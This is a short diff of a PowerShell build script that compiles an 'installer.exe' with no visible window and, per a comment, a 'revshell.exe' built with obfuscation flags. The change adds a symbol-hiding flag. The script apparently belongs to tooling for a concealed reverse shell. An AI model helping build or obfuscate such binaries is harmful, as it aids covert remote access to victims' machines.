@@ -5,7 +5,7 @@ gcc -o executables/installer.exe installer.c `
     -I"C:\msys64\mingw64\include" `
     -L"C:\msys64\mingw64\lib" `
     -O3 -funroll-loops -static -lssl -lcrypto -lcrypt32 -lws2_32 -lgdi32 -luser32 `
-    -static-libgcc -static-libstdc++ -mwindows `
+    -static-libgcc -static-libstdc++ -mwindows -fvisibility=hidden `
 
 # Compile revshell.exe with optimization and obfuscation flags
 $gccParams = @(
